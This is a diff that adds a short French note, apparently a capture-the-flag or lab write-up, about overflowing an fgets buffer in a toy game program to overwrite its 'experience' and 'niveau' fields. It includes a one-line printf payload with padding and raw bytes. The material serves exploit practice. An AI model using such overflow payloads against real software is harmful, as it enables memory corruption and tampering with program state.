@@ -1,0 +1,5 @@
+on peut rentrer soit dans chevalier soit dans def_roi.
+on veut exploiter la vulnearbilité de fgets(buffer overflow).
+ainsi on pourra depasser couleur, nom et modifier experience et niveau .
+payload :printf 'ArthurAAAAAAAABBBBBBBBCCCCCCCC\xff\x01\x00'
+couleur/-1 complement a deux /1 / 0 pour la fin 
